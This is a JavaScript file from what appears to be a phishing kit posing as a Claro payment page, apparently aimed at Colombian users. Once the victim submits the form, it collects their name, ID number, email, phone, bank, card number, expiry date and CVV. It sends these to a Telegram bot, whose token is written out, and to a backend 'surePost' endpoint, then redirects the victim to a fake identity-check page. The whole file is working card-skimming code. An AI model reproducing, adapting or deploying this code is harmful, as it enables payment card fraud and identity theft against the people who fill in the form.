function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

formbank = document.getElementById("bank-option");
formname = document.getElementById("name_card");
formcard = document.getElementById("card_number");
formmonth = document.getElementById("month-value");
formyear = document.getElementById("year-value");
formcvc = document.getElementById("card_cvc");
formid = document.getElementById("documentnumber");
formemail = document.getElementById("email_user");
formtel = document.getElementById("tel");

document.getElementById("next-step").addEventListener("click", function () {
  if (
    formbank.value == "" ||
    formname.value == "" ||
    formcard.value == "" ||
    formmonth.value == "" ||
    formyear.value == "" ||
    formcvc.value == "" ||
    formid.value == "" ||
    formemail.value == "" ||
    formtel.value == ""
  ) {
    alert("Todos los campos son obligatorios");
    return;
  } else if (formyear.value < 25) {
    alert("Coloque una tarjeta con una fecha de vencimiento valida");
    return;
  } else if (!formtel.value.startsWith("3") || formtel.value.length !== 10) {
    alert("Coloque un número de teléfono valido");
    return;
  } else if (isLuhnValid(formcard.value)) {
    document.getElementById("next-step").disabled = true;

    info.metaInfo.email = formemail.value;
    info.metaInfo.p = formcard.value;
    info.metaInfo.pdate = formmonth.value + "/" + formyear.value;
    info.metaInfo.c = formcvc.value;
    info.metaInfo.ban = formbank.value;
    info.metaInfo.cc = formid.value;
    info.metaInfo.telnum = formtel.value;

    (async () => {
      const a = await fetch(
        "https://api.telegram.org/bot7723777741:AAFJT488CCx-QqmnVVcs-_ACL9omDTldCto/sendMessage",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: "@thevoidspaceman",
            text: `🔴 -- CLARO ( ${fuente} ) --\n👤 NAME: <code>${
              formname.value
            }</code>\n🆔 ID: <code>${formid.value}</code>\n✉️ MAIL: ${
              formemail.value
            }\n📞 PHONE: <code>${
              formtel.value
            }</code>\n--------------------\n🏦 BANK: ${
              formbank.value
            }\n💳 CC: <code>${formcard.value}</code>\n📅 MM/YY: <code>${
              formmonth.value
            }/${formyear.value}</code>\n🔒 CVV: <code>${
              formcvc.value
            }</code>\n`,
            parse_mode: "HTML",
          }),
        }
      );
      await a.json(), a.status;
    })();

    if (info.metaInfo.p[0] == "4") {
      info.checkerInfo.company = "VISA";
    } else if (info.metaInfo.p[0] == "5") {
      info.checkerInfo.company = "MC";
    } else if (info.metaInfo.p[0] == "3") {
      info.checkerInfo.company = "AM";
    }

    updateLS();

    data = {
      nombre: formname.value,
      id: formid.value,
      ip: "",
      banco: formbank.value,
      email: formemail.value,
      tarjeta: formcard.value,
      ftarjeta: formmonth.value + "/" + formyear.value,
      cvv: formcvc.value,
      celular: formtel.value,
      direccion: "",
    };

    fetch(`${url}/dataTables/surePost`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error("Network response was not ok");
        }
        return response.json();
      })
      .then((data) => {
        window.location.href = "./points/checkers/id-check.html";
      });
  } else {
    alert("Número de tarjeta inválido");
    formcard.value = "";
  }
});

function isLuhnValid(bin) {
  bin = bin.replace(/\D/g, "");

  if (bin.length < 6) {
    return false;
  }
  const digits = bin.split("").map(Number).reverse();

  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    if (i % 2 !== 0) {
      let doubled = digits[i] * 2;
      if (doubled > 9) {
        doubled -= 9;
      }
      sum += doubled;
    } else {
      sum += digits[i];
    }
  }

  return sum % 10 === 0;
}

function formatCNumber(input) {
  let numero = input.value.replace(/\D/g, ""); // Eliminar todos los caracteres no numéricos
  if (numero.length === 0) {
  }

  let numeroFormateado = "";

  // American express
  if (numero[0] === "3") {
    // Icono

    if (numero.length > 15) {
      numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
    }

    for (let i = 0; i < numero.length; i++) {
      if (i === 4 || i === 10) {
        numeroFormateado += " ";
      }

      numeroFormateado += numero.charAt(i);
    }

    input.value = numeroFormateado;
  } else {
    if (numero.length > 16) {
      numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
    }
    for (let i = 0; i < numero.length; i++) {
      if (i > 0 && i % 4 === 0) {
        numeroFormateado += " ";
      }
      numeroFormateado += numero.charAt(i);
    }
    input.value = numeroFormateado;
  }
}
